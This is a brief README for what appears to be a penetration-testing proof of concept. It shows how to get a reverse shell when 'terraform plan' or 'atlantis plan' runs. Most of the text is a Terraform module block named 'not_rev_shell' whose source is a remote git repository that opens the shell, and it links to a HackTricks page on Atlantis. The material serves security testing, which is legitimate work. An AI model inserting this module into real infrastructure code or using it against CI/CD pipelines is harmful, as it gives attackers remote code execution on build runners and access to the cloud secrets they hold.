# terraform_external_module_rev_shell

Terraform file external dependency injection to get rev shell when `terraform plan` or `atlantis plan` is run.

```bash
module "not_rev_shell" {
  source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```

More information in https://book.hacktricks.xyz/cloud-security/atlantis
